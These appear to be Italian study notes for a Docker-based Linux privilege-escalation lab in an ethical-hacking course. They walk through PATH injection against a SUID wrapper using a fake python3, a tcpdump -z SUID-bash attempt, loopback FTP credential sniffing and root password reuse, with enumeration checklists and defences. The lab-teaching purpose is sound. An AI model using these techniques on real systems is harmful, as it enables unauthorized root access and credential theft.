# linux-privesc Lab — Privilege Escalation in Practice

> [!info] Collegamento al corso [[ETHL 0x06 — Hacking Unix p2]] · [[Cron]] · [[Dynamic Linking]] · [[HTB-Wall]] · [[LinPEAS]]

Se vuoi approfondire Linux Hacking, guarda qui [[Linux Hacking Labs]]
## 1. Introduzione al Lab

[https://github.com/5ud0ch0p/linux-privesc](https://github.com/5ud0ch0p/linux-privesc)
Il lab `linux-privesc` è un ambiente Docker-based strutturato per allenare le tecniche di privilege escalation (privesc) su sistemi Linux. Ogni utente parte come `lowpriv` (UID 1000) e deve raggiungere `root` (UID 0) attraverso una serie di vulnerabilità intenzionalmente inserite.

**Caratteristiche principali**:

- 8 Practical (0x01 - 0x08) + FINAL CHALLENGES
- Ogni Practical ha 3+ livelli di difficoltà crescente
- Tool di configurazione integrato: `./config-privescs` (SUID root)
- Ambienti containerizzati (Docker) per isolamento e riproducibilità

## 2. Collegamento con ETHL 6

ETHL 6 introduce i **concetti teorici** di privilege escalation:

- Capability e SUID/SGID binaries
- ld.so.preload e dynamic linking
- Cronjob vulnerabilities (wildcard injection, PATH poisoning)
- LinPEAS, LES e altri enumerazione tools

Questo lab è la **parte pratica** di ETHL 6: applica ogni concetto in uno scenario reale, con configurazioni intenzionalmente vulnerabili.

|ETHL Concetto|Lab Practical|Tecnica Principale|
|---|---|---|
|SUID/SGID binaries|0x05|SUID with relative paths|
|ld.so.preload|0x06|Constructor injection|
|Cronjob privesc|**0x07**|**Path injection, Wildcard injection**|
|Capabilities|0x08|Exploitation capabilitie restrictions|

## 3. Checklist Globale — Tutti i Practical

### Livello di difficoltà e aree di focus

|Practical|Tema|Difficoltà|Livelli|Vettori Principali|
|---|---|---|---|---|
|**0x01**|TBD|⭐|1-3|?|
|**0x02**|TBD|⭐⭐|1-3|?|
|**0x03**|TBD|⭐⭐|1-3|?|
|**0x04**|TBD|⭐⭐⭐|1-3|?|
|**0x05**|SUID/SGID Binaries|⭐⭐⭐|1-3|SUID bin, PATH insecuro, race condition|
|**0x06**|Dynamic Linking (ld.so.preload)|⭐⭐⭐⭐|1-3|Constructor, /etc/ld.so.preload, dlopen|
|**0x07**|**Cronjob Privilege Escalation**|⭐⭐|**1-3**|**Script scrivibile, PATH injection, Wildcard**|
|**0x08**|Capabilities & Restrictions|⭐⭐⭐⭐|1-3|CAP_*, Ambient caps bypass|

## 4. Checklist di Enumerazione (Riutilizzabile)

Prima di ogni livello, esegui questo template di enumerazione:

bash

```bash
# 1. Chi sei
id && whoami

# 2. Cosa puoi fare con sudo
sudo -l

# 3. Cronjob visibili
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/root 2>/dev/null
cat /var/spool/cron/highpriv 2>/dev/null   # misconfig se leggibile

# 4. Monitoraggio processi (per vedere cron job nascosti)
watch -n1 'ps aux | grep -v "lowpriv\|watch\|ps\|grep"'

# 5. SUID/SGID binaries
find / -perm /4000 -type f 2>/dev/null
find / -perm /2000 -type f 2>/dev/null

# 6. Capabilities
getcap -r / 2>/dev/null

# 7. File con permessi scrivibili in path critici
find /etc /tmp /var -writable -type f 2>/dev/null

# 8. File creati di recente (dopo config-privescs)
find / -newer /etc/crontab -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null

# 9. Porte aperte / servizi in ascolto
ss -tlnup
```



---

## 4. Practical 0x07 — Cronjob Privilege Escalation

### Overview

Questo practical insegna i **3 metodi** di sfruttare cronjob vulnerabili (vedi [[Cron#7. I 3 metodi di exploit]]).

### Level 1 — Script Cron Scrivibile (PATH Injection via SUID Wrapper)

**Difficoltà**: ⭐⭐ (intermedia)

**Scenario**: L'utente `highpriv` ha una crontab che esegue uno script ogni minuto. Il binario SUID `config-privescs` contiene una vulnerabilità di PATH injection che permette di ottenere root senza neanche passare per `highpriv`.

#### Enumerazione iniziale

```bash
# Verificare la propria posizione e accesso al lab
whoami                                           # lowpriv
id
ls -la /etc/crontab /etc/cron.d/
crontab -l                                        # empty per lowpriv
cat /var/spool/cron/highpriv                      # ✓ leggibile
# Output: * * * * * /tmp/jobs/cleanup
```

**Checkpoint**: Il file `/var/spool/cron/highpriv` è leggibile da `lowpriv` — misconfig dei permessi (dovrebbe essere `-rw-------`). Questo rivela che esiste un cronjob scrivibile.

#### Analisi del binario SUID vulnerabile

```bash
ls -la /home/lowpriv/config-privescs
# -rwsr-xr-x 1 root root 18K Jun 15 14:05 /home/lowpriv/config-privescs

# Leggi il sorgente del wrapper
cat /home/lowpriv/privesc/suid-wrapper/wrapper.c
```

Output:

```c
int main()
{
	setuid(0);    // ← diventa root
	setgid(0);    // ← diventa root group
	system("python3 /home/lowpriv/privesc/privescs.py");  // ← cerca python3 nel PATH
	return 0;
}
```

**Checkpoint**: Problema critico — il binario diventa root pieno (`setuid(0)`), poi lancia `python3` **senza path assoluto**. La shell che esegue `system()` eredita il PATH dell'utente che ha lanciato il binario.

#### Exploit — PATH Injection

**Step 1**: Crea un finto `python3` nella prima directory del tuo PATH

```bash
mkdir -p ~/.local/bin
cat > ~/.local/bin/python3 << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x ~/.local/bin/python3
```

**Step 2**: Verifica che il tuo `python3` sia il primo nel PATH

```bash
echo $PATH
# /home/lowpriv/.local/bin:/home/lowpriv/bin:/usr/local/bin:/usr/bin:...
#  ↑ primo ✓

hash -r                # cancella cache bash
which python3          # dovrebbe dire ~/.local/bin/python3
```

**Step 3**: Lancia il binario SUID vulnerabile

```bash
./config-privescs
```

Cosa accade:

1. Kernel: "Questo binario è SUID root, lo eseguo come root"
2. main(): `setuid(0)` → processo diventa root
3. main(): `system("python3 ...")` → shell cerca `python3` nel PATH
4. Shell: "Primo match di `python3` è `/home/lowpriv/.local/bin/python3`"
5. Esegue il **tuo script** come **root**
6. Il tuo script: `#!/bin/bash; /bin/bash -p` → shell interattiva root

**Step 4**: Verifica il risultato

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

#### Perché questo funziona — Analisi tecnica

|Componente|Ruolo|Vulnerabilità|
|---|---|---|
|**SUID bit**|Fa eseguire il binario come owner (root)|Stesso binario può essere sfruttato se contiene una vulnerabilità di escalation|
|**setuid(0) nel codice**|Innalza il privilegio da EUID=0 (SUID) a RUID=0 (root pieno)|Il processo è ora root a tutti i livelli — anche `sudo -l` lo vedrebbe come root|
|**system() senza path assoluto**|Lancia comando tramite shell, eredita PATH|La shell cerca nei nostri PATH _del processo_ (che è root), trovando il nostro fake|
|**PATH injection**|Controlliamo quale `python3` viene eseguito|Il nostro fake è nella prima directory, vince per priorità|

#### Tracciamento della privilege escalation

```
lowpriv (uid=1000) 
  ↓ 
[lancia ./config-privescs]
  ↓
lowpriv esegue binario SUID
  ↓
Kernel: EUID=0 (grazie SUID)
  ↓
main() chiama setuid(0) → RUID=0 (ora root pieno)
  ↓
main() chiama system("python3 ...") 
  ↓
Shell eredita RUID=0 (root pieno), PATH=lowpriv's PATH
  ↓
Shell cerca python3 → find ~/.local/bin/python3 (primo match)
  ↓
Esegue lo SCRIPT che noi controlliamo, come root
  ↓
Script: /bin/bash -p
  ↓
root (uid=0) 🎯
```

#### Concetti chiave

- **EUID vs RUID**: SUID imposta l'EUID (UID effettivo usato per i permessi), non il RUID (UID reale, chi sei davvero). `sudo -l` guarda il RUID → non funzionava dalla shell SUID.
- **PATH injection**: se un SUID binary chiama comandi con path relativo, controlla il PATH dell'utente che lo lancia — non il PATH di root.
- **bash -p**: senza `-p`, bash degrada i privilegi se EUID ≠ RUID. Con `-p` li mantiene.
- **Difesa**: usare sempre path assoluti (`/usr/bin/python3`) nei binari privilegiati.

#### Defesa

1. **Path assoluto**: Usare `system("/usr/bin/python3 ...")` invece di `system("python3 ...")`
2. **Sanitizzare PATH**: `setenv("PATH", "/usr/bin:/bin", 1)` prima di `system()`
3. **Evitare system()**: Usare `execve()` direttamente con array di argomenti, senza shell
4. **Capability granulari**: Usare `CAP_*` invece di SUID bit intero

#### Collegamento con la teoria

Questo è **Method 2** da [[Cron#7. I 3 metodi di exploit]]:

> **Method 2 — PATH insicuro + comando con path relativo** Se un binario/script eseguito come root chiama un comando con **path relativo** (es. `python3` non `/usr/bin/python3`) e il PATH include una directory scrivibile da te **prima** di quella legittima, ottieni RCE come root.

La differenza: invece di un cronjob, è un binario SUID. La vulnerabilità di base è identica.

### Level 2 ✅ — sudo tcpdump + FTP Credential Sniffing + Password Reuse

**Vettore**: `sudo tcpdump` → sniffing del loopback → credenziali FTP in chiaro → password reuse su root.

#### Enumerazione

bash

```bash
sudo -l
# → (root) /usr/sbin/tcpdump
# Solo tcpdump disponibile via sudo — nessun cronjob visibile in /etc/crontab
```

Primo tentativo — GTFOBins tcpdump `-z` per esecuzione comandi:

bash

```bash
TF=$(mktemp)
cat > $TF << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x $TF

sudo tcpdump -w /dev/null -G 1 -W 1 -z $TF
# Output: "dropped privs to tcpdump"
# /tmp/bash → owner: tcpdump, non root → EUID=72, non 0
```

> [!warning] Privilege Drop Le versioni moderne di tcpdump fanno `setuid(tcpdump)` dopo aver aperto l'interfaccia di rete. Il flag `-z` (postrotate command) viene eseguito **dopo** il drop — quindi come utente `tcpdump` (uid=72), non root. GTFOBins funziona solo su versioni più vecchie senza questo comportamento.

#### Pivot — Monitoraggio processi

bash

```bash
watch -n1 'ps aux | grep -v "lowpriv\|watch\|ps\|grep"'
```

Trovato processo cron ricorrente eseguito come root:

```
root  2840  /bin/sh -c (sleep 2; echo -e "USER admin\r\nPASS ..." ) | nc localhost 21
root  2842  nc localhost 21
root  2844  vsftpd
```

Un cronjob root si autentica a **vsftpd** (FTP) su localhost via `nc`. FTP è un protocollo in **chiaro** — le credenziali viaggiano non cifrate nel payload TCP.

#### Exploit — Sniffing del loopback

bash

```bash
sudo tcpdump -i lo -A -s 0 port 21
# -i lo   : interfaccia loopback (dove viaggia localhost)
# -A      : stampa payload in ASCII
# -s 0    : cattura il pacchetto intero
```

Output catturato:

```
USER admin
...
PASS n0pn0pn0pjmp
```

#### Escalation

bash

```bash
# admin non esiste come utente di sistema
cat /etc/passwd | grep admin   # → nessun risultato

# Password reuse su root
su root
# Password: n0pn0pn0pjmp
# → root shell ✅
```

#### Concetti chiave

- **FTP è cleartext**: username e password viaggiano in chiaro nel payload TCP — visibili a chiunque possa sniffare il traffico (tcpdump, Wireshark, ecc.). SSH/SFTP risolvono il problema.
- **Loopback è sniffabile**: `127.0.0.1` non è "sicuro" dalla prospettiva del sniffing — chiunque abbia accesso a `tcpdump -i lo` può leggere tutto il traffico localhost.
- **sudo tcpdump**: anche se il privilege drop impedisce l'esecuzione di comandi come root via `-z`, tcpdump può comunque **leggere** traffico di rete privilegiato → vettore di information disclosure.
- **Password reuse**: credenziali usate in un servizio applicativo (FTP) non devono mai coincidere con credenziali di sistema, specialmente root.
- **Difesa**: usare SFTP/SCP al posto di FTP; non usare password di root per servizi applicativi; isolare i servizi da loopback se possibile.

### Level 3 — [TBD: probabilmente Wildcard Injection con tar]



---

## 5. Checklist di enumerazione per ogni Practical

Adatta questa checklist quando affronta ogni nuovo livello:

### Passo 1 — Ricognizione utenti e privilegi

```bash
whoami
id
groups
sudo -l
sudo -S -l < <(echo "password")     # se conosci la password
```

### Passo 2 — Ricerca di cronjob vulnerabili

```bash
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/<username>      # se leggibile
ls -la /etc/cron.{daily,hourly,weekly,monthly}/
cat /etc/anacrontab
```

### Passo 3 — SUID/SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
# Controlla source code o disassembly se disponibile
```

### Passo 4 — Capabilities

```bash
getcap -r / 2>/dev/null
```

### Passo 5 — Writable directories in PATH / /etc

```bash
echo $PATH
for dir in $(echo $PATH | tr ':' '\n'); do ls -ld "$dir" 2>/dev/null; done
ls -ld /etc/
```

### Passo 6 — LinPEAS (solo se altri check non danno risultati immediati)

```bash
./linpeas.sh | tee output.txt
# Leggi sezioni: SUID, Cron, Writable files, Capabilities
```

---

## 6. Lezioni d'esame

1. **Misconfig di permessi**: Il file `/var/spool/cron/highpriv` non dovrebbe essere leggibile da altri utenti — questo rivela il vettore
2. **SUID + unsafe functions**: Combinazione letale — non basta il bit SUID, è come viene usato che conta
3. **Path resolution**: Capire che `system()` usa la shell dell'utente corrente, che eredita il PATH — fondamentale
4. **Isolamento dei privilegi**: `setuid(0)` diventa root pieno, non solo "elevazione parziale" — grande differenza
5. **Fake binari**: Non è un "bypass" del sistema — stai solo controllando quale file eseguibile viene trovato prima nel PATH

extra:
## 6. Lezioni per l'Esame

> [!tip] Cosa ricordare
> 
> - **Method 1 (script scrivibile)**: script cron a cui hai accesso write → sovrascrivi con reverse shell
> - **Method 2 (PATH injection)**: comando con path relativo + PATH che controlli → metti fake binary prima
> - **Method 3 (wildcard)**: cronjob con `*` non quotato → crea file con nome falso come flag/opzione tar
> - **LinPEAS non è "find all vulns"** — è "find plausible vectors" — tutti i rossi vanno verificati a mano
> - **Container ≠ VM** — kernel condiviso, isolamento via namespace (non hypervisor)
> - **GTFOBins non è infallibile** — il comportamento dipende dalla versione del binary (es. privilege drop in tcpdump)
> - **Monitorare i processi** è fondamentale quando i crontab non sono leggibili — `watch -n1 ps aux`
> - **FTP in chiaro** — se vedi vsftpd + tcpdump disponibile, sniffa il loopback

---

## 7. Domande di richiamo attivo

1. Perché il file `/var/spool/cron/highpriv` dovrebbe essere `-rw-------` e non `-rw-r--r--`?
2. Qual è la differenza tra EUID=0 (SUID) e RUID=0 (dopo `setuid(0)`)?
3. Se usi `system("/bin/sh -c \"comando\"")`, quale PATH eredita `comando` — quello di chi ha lanciato il binario, o quello di root?
4. Come saresti bloccato se il wrapper usasse `/usr/bin/python3` (path assoluto) invece di `python3`?
5. Cosa fa `hash -r` in bash?

domande 2:
- Perché `sudo -l` non funzionava dalla shell SUID nel Level 1?
- Qual è la differenza tra EUID e RUID? Chi usa quale?
- Perché `bash -p` è necessario in una shell lanciata da un SUID binary?
- Cosa fa esattamente `tcpdump -z`? Perché fallisce come vettore root su tcpdump moderno?
- Perché FTP su loopback (`localhost`) non è sicuro dalla prospettiva del sniffing?
- In un pentest reale, cosa faresti invece di aprire una shell interattiva come root?
- Come difenderesti un sistema da credential sniffing via tcpdump?